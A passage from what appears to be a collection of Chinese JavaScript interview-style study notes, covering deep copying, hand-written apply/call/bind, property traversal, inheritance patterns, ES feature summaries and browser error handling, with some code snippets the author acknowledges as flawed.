[...b];\n```\n\n## 2. 深拷贝的简易实现\n\n```javascript\nfunction deepCopy(obj) {\n  if (typeof obj !== \"object\") {\n    return obj;\n  }\n  const newObj = Array.isArray(obj) ? [] : {};\n  for (let key in obj) {\n    newObj[key] = deepCopy(obj[key]);\n  }\n  return newObj;\n}\n```\n\n## 3. 如何解决循环引用问题：`WeakMap`\n\n```javascript hl:5,9,2\nfunction deepCopy(obj, hash = new WeakMap()) {\n  // 基本类型\n  if (typeof obj !== \"object\") {\n    return obj;\n  }\n  if (hash.has(obj)) {\n    return hash.get(obj);\n  }\n  const newObj = Array.isArray(obj) ? [] : {};\n  hash.set(obj, newObj);\n  for (let key in obj) {\n    newObj[key] = deepCopy(obj[key], hash);\n  }\n  return newObj;\n}\n```\n\n## 4. 考虑其他类型\n\n```javascript hl:15\n// 考虑 \bRegExp、Date、Function、Symbol、Map、Set、WeakMap、WeakSet、Error、Promise、BigInt 等特殊对象\nfunction deepCopy(obj, hash = new WeakMap()) {\n  if (obj instanceof RegExp) return new RegExp(obj);\n  if (obj instanceof Date) return new Date(obj);\n  if (obj instanceof Function) return new Function(obj);\n  if (obj instanceof Symbol) return new Symbol(obj);\n  if (obj instanceof Map) return new Map(obj);\n  if (obj instanceof Set) return new Set(obj);\n  if (obj instanceof WeakMap) return new WeakMap(obj);\n  if (obj instanceof WeakSet) return new WeakSet(obj);\n  if (obj instanceof Error) return new Error(obj);\n  if (obj instanceof Promise) return new Promise(obj);\n  if (obj instanceof BigInt) return new BigInt(obj);\n\n  // 基本类型\n  if (typeof obj !== \"object\") {\n    return obj;\n  }\n  if (hash.has(obj)) {\n    return hash.get(obj);\n  }\n  const newObj = Array.isArray(obj) ? [] : {};\n  hash.set(obj, newObj);\n  for (let key in obj) {\n    newObj[key] = deepCopy(obj[key], hash);\n  }\n  return newObj;\n}\n```\n\n## 5. 上面的代码肯定有问题的，比如函数，symbol ， map 、set 等\n\n```javascript\nfunction deepCopy(obj, hash = new WeakMap()) {\n  // 处理null和undefined\n  if (obj === null || typeof obj === 'undefined') return obj;\n\n  // 处理基本类型\n  if (typeof obj !== \"object\" && typeof obj !== \"function\") {\n    return obj;\n  }\n\n  // 处理已经复制过的对象（循环引用）\n  if (hash.has(obj)) {\n    return hash.get(obj);\n  }\n\n  // 处理特殊对象类型\n  if (obj instanceof Date) return new Date(obj);\n  if (obj instanceof RegExp) return new RegExp(obj);\n  if (obj instanceof Error) return new Error(obj.message);\n\n  // 处理函数\n  if (typeof obj === 'function') {\n    return function() {\n      return obj.apply(this, arguments);\n    };\n  }\n\n  // 处理 Symbol\n  if (typeof obj === 'symbol') return Object(Symbol.prototype.valueOf.call(obj));\n\n  // 处理 Map\n  if (obj instanceof Map) {\n    const newMap = new Map();\n    hash.set(obj, newMap);\n    obj.forEach((value, key) => {\n      newMap.set(deepCopy(key, hash), deepCopy(value, hash));\n    });\n    return newMap;\n  }\n\n  // 处理 Set\n  if (obj instanceof Set) {\n    const newSet = new Set();\n    hash.set(obj, newSet);\n    obj.forEach(value => {\n      newSet.add(deepCopy(value, hash));\n    });\n    return newSet;\n  }\n\n  // 处理 WeakMap 和 WeakSet\n  if (obj instanceof WeakMap || obj instanceof WeakSet) {\n    // 这些对象不能被深拷贝，返回新的空实例\n    return new obj.constructor();\n  }\n\n  // 处理 Promise\n  if (obj instanceof Promise) {\n    return new Promise((resolve, reject) => {\n      obj.then(\n        value => resolve(deepCopy(value, hash)),\n        error => reject(deepCopy(error, hash))\n      );\n    });\n  }\n\n  // 处理 BigInt\n  if (typeof obj === 'bigint') return BigInt(obj.toString());\n\n  // 处理普通对象和数组\n  const newObj = Array.isArray(obj) ? [] : {};\n  hash.set(obj, newObj);\n  \n  for (const key in obj) {\n    if (Object.prototype.hasOwnProperty.call(obj, key)) {\n      newObj[key] = deepCopy(obj[key], hash);\n    }\n  }\n\n  // 处理不可枚举属性\n  const symbolProperties = Object.getOwnPropertySymbols(obj);\n  for (const sym of symbolProperties) {\n    newObj[sym] = deepCopy(obj[sym], hash);\n  }\n\n  return newObj;\n}\n\n```\n\n也可使用 Reflect.ownKeys 来遍历对象，它包含 Object.keys 的属性 和 symbals 属性，如下代码\n\n>  没考虑 函数、正则、日期、Math 等等\n\n```javascript\nfunction deepCopy(obj, weakMap = new WeakweakMap()) {\n  // 基本数据类型\n  if (\n    [\"String\", \"Boolean\", \"Number\", \"Null\", \"Undefined\"].includes(getType(obj))\n  ) {\n    return obj;\n  }\n  // 如果是对象\n  if (weakMap.get(obj)) {\n    return obj;\n  }\n  let target = Array.isArray(obj) ? [] : {};\n  weakMap.set(obj, target);\n  // TODO 这个不会检测出symbol\n  // 1、可以使用 Reflect.keys 全部能检测出全部 keys ，包括 symbol keys\n  // 2、可以使用 Object.getOwnPropertySymbols(obj) 检测出 symbol keys\n  Reflect.ownKeys(obj).forEach((key) => {\n    // 改动\n    if (isObject(obj[key])) {\n      target[key] = deepCopy(obj[key], weakMap);\n    } else {\n      target[key] = obj[key];\n    }\n  });\n  return target;\n}\n```\n\n## 6. JSON 的方式实现\n\n`json`的方式会丢失很多内容，比如 map、regexp、set、date、set、函数以及循环引用的问题\n\n## 7. 最后：建议\n\n还是使用 `loadsh` 、`Ramda` 等库吧 ，细节还有很多需要考虑的，别自己造轮子\n\n","WTIHrDQr":"\n# apply、call、bind 的区别及简易实现\n\n`#javascript` \n\n\n## 目录\n<!-- toc -->\n ## 1. 区别 \n\n1. call 和 apply 的区别主要在于参数的传递方式:\n    - call 接受一系列参数：`fn.call(obj,arg1,arg2)`\n    - apply 接受一个参数数组：`fn.apply(obj,[arg1,arg2])`\n2. bind 与 call/apply 的主要区别 → ==是否立即执行==\n    - call 和 apply 会**立即执行**函数\n    - bind **返回一个新函数**,可以稍后执行\n3. 使用场景:\n    - call/apply: \n        - 当你想**立即调用函数**,并`临时`改变 this 指向时使用\n    - bind: \n        - 当你想创建一个**永久改变 this 指向**的**新函数**时使用,常用于回调函数中保持 this 指向\n\n## 2. 手写 apply\n\n```javascript\n// 使用ES6语法实现的apply \nFunction.prototype._apply = function (context = window, args) {\n  // 首先要获取那个函数调用了 apply ，即 this\n  // 比如 foo.apply(bar, [1, 2, 3]) , 这里的 this 就是 foo\n  context.fn = this;\n  let res;\n  if (Array.isArray(args)) {\n    res = context.fn(...args);\n  } else {\n    // none args\n    res = context.fn();\n  }\n  delete context.fn;\n  return res;\n};\n```\n\n## 3. 手写 call\n\n```javascript\n// 使用ES6语法实现的call: 记得使用扩展运算符\nFunction.prototype._call = function (context = window, ...args) {\n  // 首先要获取那个函数调用了 call ，即 this\n  // 比如 foo.call(bar, 1, 2, 3) , 这里的 this 就是 foo\n  context.fn = this;\n\n  let res = context.fn(...args);\n\n  delete context.fn;\n  return res;\n};\n```\n\n## 4. 手写 bind\n\n```javascript hl:4,7\n// 使用ES6语法实现的bind\nFunction.prototype._bind = function (context = window, ...args) {\n  let fn = this;\n  // 返回的一个新函数: 注意这里需要合并参数\n  return function (...newArgs) {\n    return fn.apply(context, args.concat(newArgs));\n    // 如果要求不能使用 apply, 那么就使用 上面定义的 _apply\n    // return fn._apply(context, args.concat(newArgs));\n  };\n};\n```\n","RQXB8tah":"\n# 遍历对象的方式\n\n`#javascript` \n\n\n## 目录\n<!-- toc -->\n ## 1. 列举 \n\n- 使用 `Object.keys()` 当：\n    - 只需要`可枚举`属性\n    - 不返回`继承`的属性\n    - 不需要 Symbol 属性\n    - 性能是主要考虑因素\n        - `Object.keys()` ==通常性能更好==，因为它只处理可枚举属性 \n- 使用 `Reflect.ownKeys()` 当：\n    - 返回对象的**所有有属性键的数组** ，包括：\n        - 所有字符串键（可枚举和不可枚举）\n        - 所有 Symbol 键（可枚举和不可枚举）\n        - **不返回继承的属性** \n        - 不会返回==原型链==上的属性和方法\n    - 返回顺序：\n        1. 数字键（按升序）\n        2. 字符串键（按添加顺序）\n        3. Symbol 键（按添加顺序）\n- **for...in 循环**\n\t- 返回**所有可枚举**属性，包括**继承**的\n\t\t- ==所以慢啊==\n\t- 不返回 Symbol 属性\n- 在开发工具、框架或需要完整反射功能的场景中，`Reflect.ownKeys()` 是更好的选择\n\n## 2. 选择指南\n\n1. **需要遍历继承的属性**\n    - 使用 `for...in`\n2. **只需要自身可枚举属性**\n    - 使用 `Object.keys()`\n3. **需要所有属性（包括不可枚举）**\n    - 使用 `Object.getOwnPropertyNames()`\n        - 只返回对象自身的属性\n        - 不返回`原型链`上的属性\n        - 返回的是一个字符串数组\n        - 不返回 Symbol 属性\n4. **需要 Symbol 属性**\n    - 使用 `Object.getOwnPropertySymbols()`\n    - 只返回对象的 Symbol 类型的\n        - 包括可枚举和不可枚举的 Symbol\n        - 不包含字符串键\n5. **需要所有类型的属性**\n    - 使用 `Reflect.ownKeys()`\n6. **需要键值对**\n    - 使用 `Object.entries()`\n7. **只需要值**\n    - 使用 `Object.values()`\n\n## 3. 如何返回原型链上的所有属性和方法\n\n### 3.1. 使用 for...in 循环\n\n最简单的方法，会遍历对象本身及其原型链上的所有可枚举属性：\n\n```javascript\nclass Animal {\n    constructor() {\n        this.type = 'animal';\n    }\n    eat() {\n        console.log('eating');\n    }\n}\n\nclass Dog extends Animal {\n    constructor() {\n        super();\n        this.name = 'dog';\n    }\n    bark() {\n        console.log('woof');\n    }\n}\n\nconst dog = new Dog();\n\n// 使用 for...in\nconst propsWithForIn = [];\nfor (let prop in dog) {\n    propsWithForIn.push(prop);\n}\nconsole.log('for...in:', propsWithForIn);\n// 输出: ['name', 'type', 'bark', 'eat']\n```\n\n>  这也是为什么通常 for-in 都很慢的原因\n\n### 3.2. 手动遍历原型链\n\n如果需要包括不可枚举属性，可以手动遍历原型链：\n\n```javascript hl:5\nfunction getAllProperties(obj) {\n    const props = new Set();\n    \n    let currentObj = obj;\n    while (currentObj !== null) {\n        // 获取当前对象的所有属性（包括不可枚举的）\n        Reflect.ownKeys(currentObj).forEach(key => props.add(key));\n        // 获取原型对象\n        currentObj = Object.getPrototypeOf(currentObj);\n    }\n    \n    return Array.from(props);\n}\n\n// 测试\nclass Base {\n    constructor() {\n        this.baseProperty = 'base';\n        // 添加一个不可枚举属性\n        Object.defineProperty(this, 'hidden', {\n            value: 'hidden property',\n            enumerable: false\n        });\n    }\n    \n    baseMethod() {}\n}\n\nclass Derived extends Base {\n    constructor() {\n        super();\n        this.derivedProperty = 'derived';\n    }\n    \n    derivedMethod() {}\n}\n\nconst instance = new Derived();\n\nconsole.log('All properties:', getAllProperties(instance));\n// 输出包括所有属性和方法，包括不可枚举的\n```\n","P9XNdmw6":"\n# JavaScript 的组成\n\n`#javascript` \n\n\n## 目录\n<!-- toc -->\n ## 1. Javascript 的组成 \n\n![image.png|632](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/a9104fded4d48d2d613eecce29dc3a26.png)\n\n- ECMAScript：由 ECMA-262 定义并提供核心功能\n- 文档对象模型(DOM)：\n\t- 提供与`网页内容`交互的方法和接口\n- 浏览器对象模型(BOM)：\n\t- 提供与`浏览器`交互的方法和接口\n\n> - ECMA-262：ECMA-262 是由欧洲计算机制造商协会（ECMA）发布的一项标准，正式名称为“ECMAScript 语言规范\n\n\n> - 至于 262 没有什么特别的含义，就是一个代号\n> - TC39 委员会：ECMA-262 由 TC39（ECMAScript 技术委员会）负责制定和维护，该委员会由来自各大科技公司的专家组成，定期讨论和推进 ECMAScript 标准的演进。\n> - 最新的规范草案请见 [https://tc39.es/ecma262/](https://tc39.es/ecma262/)\n\n## 2. Javascript 为何有如此“地位”\n\n- 与 HTML/CSS 完全集成\n- 所有的主流浏览器支持\n\n## 3. 浏览器上的 Javascript 能做什么 和 不能做什么？\n\n- JavaScript 的能力很大程度上取决于它`运行的环境`。\n\t- 例如，[Node.js](https://wikipedia.org/wiki/Node.js) 支持允许 JavaScript 读取/写入任意文件，执行网络请求等的函数\n\t- 浏览器上的 Javascript 的能力都是浏览器提供的\n\t\t- app webview 上 JavaScript 的能力都是`嵌入的 APP` 提供\n\t\t\t- 比如 `webview` 组件提供了很多配置项，用于是否开启一些能力\n\t\t\t\t- 比如是否开启 Locastarage , iframe 的一些配置等等\n\n### 3.1. 能做什么\n\n- DOM：\n\t- 操作 HTML 及 CSS\n- BOM：\n\t- 操作浏览器提供的各类 API\n- 请求资源：\n\t- 访问资源、上传、下载资源\n- 本地存储：\n\t- cookie、localstarage 、sessionstrage 等\n\n### 3.2. 不能做什么\n\n- 浏览器端读、写文件，但可以通过 `input type=file` 选择文件\n- 直接访问原生系统的一些能力，比如调取摄像头、麦克风等\n\t- 通过==特殊标签==可以调取\n- 不能在`随意在不同窗口间通信`，需要一些限制，比如同域\n\n## 4. JS 的超级们\n\n- [CoffeeScript](https://coffeescript.org/) \n\t- 现在基本不用了\n- [TypeScript](https://www.typescriptlang.org/) \n\t- 添加了严格的数据类型校验，后面会详细说它。微软出品。\n- [Flow](https://flow.org/) \n\t- 也添加了数据类型，但是以一种不同的方式。由 Facebook 开发。\n- [Dart](https://www.dartlang.org/) `Flutter` 使有语言，它也可以被编译成 JavaScript，由 Google 开发。\n- [Brython](https://brython.info/)  \n\t- Python 到 JavaScript 的转译器\n- [Kotlin](https://kotlinlang.org/docs/reference/js-overview.html) \n\t- 是一个现代、简洁且安全的编程语言，编写出的应用程序可**以在浏览器和 Node 环境中运行**。\n","oPFmdhlz":"\n# javascript 中实现继承的方式\n\n`#R2` `#javascript` \n\n\n## 目录\n<!-- toc -->\n ## 1. es6： extend \n\n```javascript\nclass Parent {\n  constructor(name) {\n    this.name = name;\n    this.colors = [\"red\", \"blue\"];\n  }\n\n  getName() {\n    return this.name;\n  }\n}\n\nclass Child extends Parent {\n  constructor(name, age) {\n    super(name);\n    this.age = age;\n  }\n\n  getAge() {\n    return this.age;\n  }\n}\n\n```\n\n## 2. es5：原型链继承\n\n```javascript\n// 缺点：引用类型属性被所有示例共享\nChild.prototype = new Parent();\n```\n\n## 3. es5：借用构造函数继承\n\n```javascript\n/*********************************************\n // 832: 借用构造函数继承\n 优点1：避免引用类型属性被所有示例共享\n 优点2：可以在 Child 中向 Parent 传参\n 缺点：每次创建实例都会创建一遍方法\n *********************************************/\nfunction Child(name) {\n    // 832: 使用call函数\n    Parent.call(this, name);\n}\n```\n\n## 4. es5：原型链继承 + 借用构造函数\n\n```javascript\n/*********************************************\n // 832: 原型链继承 + 借用构造函数\n 优点1：避免引用类型属性被所有示例共享\n 优点2：可以在 Child 中向 Parent 传参\n 优点3：方法不用重新创建，在原型链上\n *********************************************/\n// 关键点1：\nfunction Child(name) {\n    Parent.call(this, name);\n}\n\n// 关键点2：\nChild.prototype = new Parent();\nChild.prototype.constructor = Child;\n```\n\n## 5. ES5： Object.create\n\n```javascript\n/*********************************************\n // 832: 即ES5 Object.create ， 将传入的对象作为创建的对象的原型\n 缺点：引用类型属性被所有示例共享，和原型链一样\n *********************************************/\nfunction myCreate(o) {\n    function F() {\n    }\n\n    F.prototype = o;\n    return new F();\n}\n```\n\n## 6. es5：寄生式继承\n\n```javascript\n/*********************************************\n // 832: 寄生式继承\n 缺点：每次创建实例都会创建一遍方法\n *********************************************/\nfunction createObj(o) {\n    let clone = Object.create(o);\n    clone.sayName = function () {\n        console.log('hi');\n    }\n    return clone;\n}\n```\n\n## 7. es5：寄生组合式继承：最佳方式\n\n```javascript\n/*********************************************\n // 832: 寄生组合式继承\n 优点1：这种方式的高效率体现它只调用了一次 Parent 构造函数，\n 优点2：并且因此避免了在 Parent.prototype 上面创建不必要的、多余的属性。\n 优点3：与此同时，原型链还能保持不变；因此，还能够正常使用 instanceof 和 isPrototypeOf。\n *********************************************/\nfunction prototype(child, parent) {\n    let p = Object.create(parent.prototype);\n    p.constructor = child;\n    child.prototype = p;\n}\n```\n\n","m0U6Vfdo":"\n# ES6（ES2015） 到 ES2024 的主要特性\n\n`#javascript` \n\n\n## 目录\n<!-- toc -->\n ## ES6 (ES2015) - 最重要的版本 \n\n```javascript\n// 1. let 和 const\nlet x = 1;\nconst y = 2;\n\n// 2. 箭头函数\nconst fn = () => {};\n\n// 3. 解构赋值\nconst [a, b] = [1, 2];\nconst {name} = {name: 'test'};\n\n// 4. 模板字符串\nconst str = `Hello ${name}`;\n\n// 5. Class 语法\nclass Person {\n    constructor() {}\n}\n\n// 6. Promise\nnew Promise((resolve, reject) => {});\n\n// 7. 模块化\nimport/export\n\n// 8. 默认参数\nfunction fn(x = 1) {}\n\n// 9. 展开运算符\n[...array]\n```\n\n## ES2016\n\n```javascript\n// 1. 指数运算符\n2 ** 3\n\n// 2. Array.includes()\n[1,2].includes(1)\n```\n\n## ES2017\n\n```javascript\n// 1. async/await\nasync function fn() {\n    await promise;\n}\n\n// 2. Object.values/entries\nObject.values({a: 1})\nObject.entries({a: 1})\n\n// 3. String padding\n'1'.padStart(2, '0')\n```\n\n![图片&文件](./files/20241111-35.png)\n\n## ES2018\n\n```javascript\n// 1. Rest/Spread 属性\nconst {a, ...rest} = obj;\n\n// 2. 异步迭代 for-of\nfor await (const x of array) {}\n\n// 3. Promise.finally()\npromise.finally()\n```\n\n## ES2019\n\n```javascript hl:3\n// 1. Array.flat/flatMap\n[1, [2]].flat()\n// 它结合了 `map()` 和 `flat()` 的功能，可以同时完成映射和扁平化操作\narray.flatMap()  \n\n// 2. Object.fromEntries\nObject.fromEntries(['a', 1](/post/m0U6Vfdo.html#'a',-1))\n\n// 3. String.trimStart/trimEnd\nstr.trimStart()\n```\n\n## ES2020\n\n```javascript hl:5\n// 1. 可选链操作符\nobj?.prop\n\n// 2. 空值合并操作符\nnull ?? 'default'\n\n// 3. BigInt\nconst big = 9007199254740991n\n\n// 4. Promise.allSettled\nPromise.allSettled([p1, p2])\n```\n\n### globalThis\n\n![图片&文件](./files/20241111-36.png)\n\n## ES2021\n\n```javascript\n// 1. 逻辑赋值运算符\nx ||= y   => x = x||y\nx &&= y   => x = x&&y\nx ??= y   => x = x??y\n\n// 2. String.replaceAll\n'abc'.replaceAll('a', 'b')\n\n// 3. Promise.any\nPromise.any([p1, p2])\n```\n\n![图片&文件](./files/20241111-37.png)\n\n![图片&文件](./files/20241111-38.png)\n\n## ES2022\n\n```javascript hl:4\n// 1. Class 字段\nclass A {\n    x = 1;\n    `#private` = 2;\n    static y = 3;\n}\n\n// 2. Top-level await\nawait promise;\n\n// 3. Array.at()\narray.at(-1) \n[1,2,3].at(0)  // 1\n[1,2,3].at(1)  // 2\n[1,2,3].at(2)  // 3\n```\n\n## ES2023\n\n```javascript\n// 1. Array 查找从后向前\narray.findLast()\narray.findLastIndex()\n\n// 2. Hashbang Grammar\n`#!/usr/bin/env` node\n\n// 3. WeakMap 支持 Symbol 键\n```\n\n## ES2024 (提案阶段)\n\n```javascript\n// 1. Promise.withResolvers\nconst {promise, resolve, reject} = Promise.withResolvers()\n// 更优雅的方式来处理 Promise 的创建和控制,不用包在 Promise 里面了\n// 看起来更线性了\n\n\n// 2. 新增 RegExp v flag\n/foo/v.test('foo')\n\n// 3. String.prototype.isWellFormed\nstr.isWellFormed()\nstr.toWellFormed()\n```\n\n## 重要性排序（TOP 10）\n\n1. let/const\n2. 箭头函数\n3. async/await\n4. 解构赋值\n5. Promise\n6. 模块化(import/export)\n7. Class 语法\n8. 可选链(`?.`)\n9. 展开运算符(`...`)\n10. 模板字符串\n","49pCkp80":"\n# window.onerror 和 window.addEventListener 的区别？\n\n`#javascript` \n\n\n## 目录\n<!-- toc -->\n ## 1. 语法和使用方式 \n\n### 1.1. **window.onerror**:  \n\n用于捕获**未被 try-catch 捕获的 JavaScript 运行时**错误。\n\n- 只能设置一个处理函数\n- 后面的赋值会覆盖前面的\n- 可以捕获语法错误和运行时错误\n- **无法捕获异步错误（Promise）**\n- 设置**返回值为 true** 可以阻止浏览器默认的错误处理\n\n```javascript\n// 基本语法\nwindow.onerror = function(message, source, lineno, colno, error) {\n    // message: 错误信息\n    // source: 发生错误的脚本URL\n    // lineno: 发生错误的行号\n    // colno: 发生错误的列号\n    // error: Error对象\n    console.log('捕获到错误：', {\n        message,\n        source,\n        lineno,\n        colno,\n        error\n    });\n    return true; // 返回 true 可以阻止浏览器默认的错误处理\n};\n\n// 示例\nwindow.onerror = function(msg, url, line, col, error) {\n    console.log(`错误: ${msg} \\n在 ${url} 第 ${line} 行`);\n    return false;\n};\n```\n\n### 1.2. **window.addEventListener**:\n\n`addEventListener` 是事件监听器，可以**添加多个错误处理函数**。\n\n```javascript\n// 基本语法\nwindow.addEventListener('error', function(event) {\n    // event.message: 错误信息\n    // event.filename: 发生错误的文件\n    // event.lineno: 行号\n    // event.colno: 列号\n    // event.error: Error对象\n    console.log('错误事件：', event);\n}, false);\n\n// 示例\nwindow.addEventListener('error', (event) => {\n    console.log('捕获到错误：', {\n        message: event.message,\n        filename: event.filename,\n        lineno: event.lineno,\n        colno: event.colno,\n        error: event.error\n    });\n}, false);\n```\n\n特点：\n1. 可以添加多个错误处理函数\n2. 不会相互覆盖\n3. 可以捕获资源加载错误（如图片加载失败）\n4. **同样无法捕获 Promise 错误**\n\n## 2. 主要区别\n\n### 2.1. **错误捕获范围**:\n\n- `window.onerror` 主要捕获 **JavaScript 运行时错误和语法错误**\n- `window.addEventListener('error')` 可以**捕获更广泛的错误**\n\t- 包括资源加载错误（如图片加载失败 ）\n\t- JavaScript 运行时错误\n\n```javascript\n// onerror 只能有一个处理函数\nwindow.onerror = function(msg) {\n    console.log('处理器1');\n};\nwindow.onerror = function(msg) {\n    console.log('处理器2'); // 会覆盖处理器1\n};\n\n// addEventListener 可以有多个处理函数\nwindow.addEventListener('error', function(event) {\n    console.log('处理器1');\n});\nwindow.addEventListener('error', function(event) {\n    console.log('处理器2');\n}); // 两个处理器都会执行\n```\n\n### 2.2. **处理机制**:\n\n- `window.onerror` 一次只能设置一个处理函数，新的会覆盖旧的\n- `addEventListener` 可以添加多个错误处理函数，它们会按照添加顺序依次执行 \n\n### 2.3. **返回值处理**:\n\n- `window.onerror` \n\t- 返回 `true` 可以阻止默认错误处理\n- `addEventListener` \n\t- 需要使用 `event.preventDefault()` 来阻止默认行为\n\n### 2.4. **错误信息获取**:\n\n- `window.onerror` 接收分散的参数：\n\t- message, source, lineno, colno, error\n- `addEventListener` 通过单个 `event 对象`获取所有信息\n\n### 2.5. **资源加载错误的处理**：\n\n```javascript hl:8\n// onerror 无法捕获资源加载错误\nwindow.onerror = function(msg) {\n    console.log('这里捕获不到图片加载错误');\n};\n\n// addEventListener 可以捕获资源加载错误\nwindow.addEventListener('error', function(event) {\n    if (event.target && (event.target.tagName === 'IMG' || event.target.tagName === 'SCRIPT')) {\n        console.log('资源加载失败:', event.target.src);\n    }\n}, true); // 注意这里使用捕获阶段\n```\n\n## 3. 实际应用示例\n\n```javascript hl:23\n// 同时使用两种方式捕获错误\n// 方式1：onerror\nwindow.onerror = function(message, source, lineno, colno, error) {\n    console.log('捕获到错误 (onerror):', {\n        message,\n        source,\n        lineno,\n        colno,\n        error\n    });\n    return true;\n};\n\n// 方式2：addEventListener\nwindow.addEventListener('error', function(event) {\n    console.log('捕获到错误 (addEventListener):', {\n        message: event.message,\n        filename: event.filename,\n        lineno: event.lineno,\n        colno: event.colno,\n        error: event.error\n    });\n    // 如果是资源加载错误\n    if (event.target && (event.target.localName === 'img' || event.target.localName === 'script')) {\n        console.log('资源加载错误:', event.target.src);\n    }\n}, true);\n```\n\n## 4. 注意事项\n\n### 4.1. 跨域脚本错误处理需要特别注意：\n\n```html\n<!-- 添加 crossorigin 属性 -->\n<script crossorigin=\"anonymous\" src=\"https://other-domain.com/app.js\"></script>\n```\n\n### 4.2. 某些错误可能无法被捕获：\n\n- Promise 中的错误需要使用 `unhandledrejection` 事件\n- 某些浏览器可能限制错误信息的详细程度\n\n### 4.3. 性能影响\n\n- 错误处理应该是轻量级的\n- 考虑错误**采样和聚合**\n- **避免在错误处理中产生新的错误**\n\n## 5. Promise 错误处理\n\n1. `unhandledrejection` 专门处理未被捕获的 Promise 错误\n2. 如果 Promise 错误被正确捕获（使用 `.catch()` 或 `try/catch`），就不会触发 `unhandledrejection`\n3. 错误处理时机很重要，延迟处理可能会导致 `unhandledrejection` 被触发\n4. 建议在生产环境中始终添加全局的 `unhandledrejection` 处理器，作为**最后的错误防线**\n\n对于 Promise 错误，需要使用 `unhandledrejection` 事件：\n\n```javascript\n// Promise 错误处理\nwindow.addEventListener('unhandledrejection', function(event) {\n    console.log('Promise 错误：', event.reason);\n    event.preventDefault(); // 阻止默认处理\n});\n\n// 示例\nPromise.reject('Promise 失败').catch(err => {\n    // 有 catch 处理则不会触发 unhandledrejection\n});\n\nnew Promise((resolve, reject) => {\n    throw new Error('Promise 错误');\n}); // 会触发 unhandledrejection\n```\n\n## 6. 完整的错误处理方案\n\n```javascript\n// 综合错误处理示例\nclass ErrorHandler {\n    constructor() {\n        this.init();\n    }\n\n    init() {\n        // 处理常规运行时错误\n        window.onerror = (msg, url, line, col, error) => {\n            this.handleError({\n                type: 'runtime',\n                msg,\n                url,\n                line,\n                col,\n                error\n            });\n            return true;\n        };\n\n        // 处理资源加载错误\n        window.addEventListener('error', (event) => {\n            if (event.target && (event.target.tagName === 'IMG' || event.target.tagName === 'SCRIPT')) {\n                this.handleError({\n                    type: 'resource',\n                    target: event.target.tagName,\n                    url: event.target.src\n                });\n            }\n        }, true);\n\n        // 处理 Promise 错误\n        window.addEventListener('unhandledrejection', (event) => {\n            this.handleError({\n                type: 'promise',\n                reason: event.reason\n            });\n            event.preventDefault();\n        });\n    }\n\n    handleError(error) {\n        console.log('错误信息：', error);\n        // 这里可以添加上报逻辑\n    }\n}\n\n// 使用\nconst errorHandler = new ErrorHandler();\n```\n\n## 7. 最佳实践建议\n\n### 7.1. **同时使用多种错误捕获方式**：\n\n```javascript\n// 综合使用多种错误捕获方式\nfunction setupErrorHandling() {\n    // 运行时错误\n    window.onerror = function(msg, url, line, col, error) {\n        console.log('运行时错误');\n        return false;\n    };\n\n    // 资源加载错误\n    window.addEventListener('error', function(event) {\n        console.log('资源加载错误');\n    }, true);\n\n    // Promise 错误\n    window.addEventListener('unhandledrejection', function(event) {\n        console.log('Promise 错误');\n    });\n}\n```\n\n### 7.2. **错误信息分类处理**：\n\n- 运行时错误\n- 资源加载错误\n- 处理 promise 错误\n\n```javascript hl:5,8,11\nclass ErrorTracker {\n    static sendError(errorInfo) {\n        // 可以根据错误类型进行不同处理\n        switch(errorInfo.type) {\n            case 'runtime':\n                // 处理运行时错误\n                break;\n            case 'resource':\n                // 处理资源加载错误\n                break;\n            case 'promise':\n                // 处理 Promise 错误\n                break;\n        }\n    }\n}\n```\n\n### 7.3. **错误上报节流**：\n\n```javascript\nfunction throttleError(fn, wait) {\n    let timer = null;\n    return function(...args) {\n        if (!timer) {\n            timer = setTimeout(() => {\n                fn.apply(this, args);\n                timer = null;\n            }, wait);\n        }\n    };\n}\n\nconst reportError = throttleError((error) => {\n    // 上报错误信息\n    console.log('错误上报：', error);\n}, 2000);\n```\n\n### 7.4. **组合使用**：\n\n- 建议同时使用两种方式以获得最完整的错误捕获覆盖\n- `window.onerror` 用于基本的 JavaScript 错误处理\n- `addEventListener` 用于捕获资源加载和其他特殊错误\n\n### 7.5. **错误上报**：\n\n```javascript\nwindow.addEventListener('error', function(event) {\n    // 上报错误信息到服务器\n    const errorInfo = {\n        type: event.type,\n        message: event.message,\n        url: event.filename,\n        line: event.lineno,\n        col: event.colno,\n        error: event.error && event.error.stack\n    };\n    // 发送错误信息\n    navigator.sendBeacon('/log/error', JSON.stringify(errorInfo));\n}, true);\n```\n\n### 7.6. **性能考虑**：\n\n- `addEventListener` 的处理函数应该尽可能简洁\n- 避免在错误处理函数中执行复杂的操作\n- 考虑使用防抖或节流来限制错误==上报频率==\n\n### 7.7. **调试支持**：\n\n```javascript\nwindow.addEventListener('error', function(event) {\n    if (process.env.NODE_ENV === 'development') {\n        console.group('Error Details');\n        console.log('Error Message:', event.message);\n        console.log('Stack Trace:', event.error && event.error.stack);\n        console.groupEnd();\n    }\n}, true);\n```\n","fOP9lXd1":"\n# 前端错误的分类、优先级管理及处理策略\n\n`#R1` `#javascript` \n\n\n## 目录\n<!-- toc -->\n ## 1. 错误分类体系 \n\n### 1.1. 运行时错误 (Runtime Errors)\n\n- JavaScript 语法错误\n- 类型错误\n- 引用错误\n\n```javascript hl:1,14,25\n// 1.1 JavaScript 语法错误\nclass RuntimeErrorHandler {\n    static handleSyntaxError(error) {\n        return {\n            category: 'Runtime',\n            subType: 'Syntax',\n            priority: 'P0',\n            error,\n            stack: error.stack,\n            recovery: 'immediate-report'\n        };\n    }\n\n    // 1.2 类型错误\n    static handleTypeError(error) {\n        return {\n            category: 'Runtime',\n            subType: 'Type',\n            priority: 'P1',\n            error,\n            stack: error.stack\n        };\n    }\n\n    // 1.3 引用错误\n    static handleReferenceError(error) {\n        return {\n            category: 'Runtime',\n            subType: 'Reference',\n            priority: 'P1',\n            error,\n            stack: error.stack\n        };\n    }\n}\n```\n\n### 1.2. 网络错误 (Network Errors)\n\n- api 错误\n\t- 不同的状态码\n- 资源加载错误\n\t- 重要资源\n\t- 不重要资源\n\n\n\n```javascript\nclass NetworkErrorHandler {\n    // 2.1 API 请求错误\n    static handleAPIError(error) {\n        const errorMap = {\n            400: { priority: 'P2', type: 'BadRequest' },\n            401: { priority: 'P0', type: 'Unauthorized' },\n            403: { priority: 'P1', type: 'Forbidden' },\n            404: { priority: 'P2', type: 'NotFound' },\n            500: { priority: 'P1', type: 'ServerError' },\n            502: { priority: 'P1', type: 'BadGateway' },\n            503: { priority: 'P0', type: 'ServiceUnavailable' },\n            504: { priority: 'P1', type: 'GatewayTimeout' }\n        };\n\n        const { priority, type } = 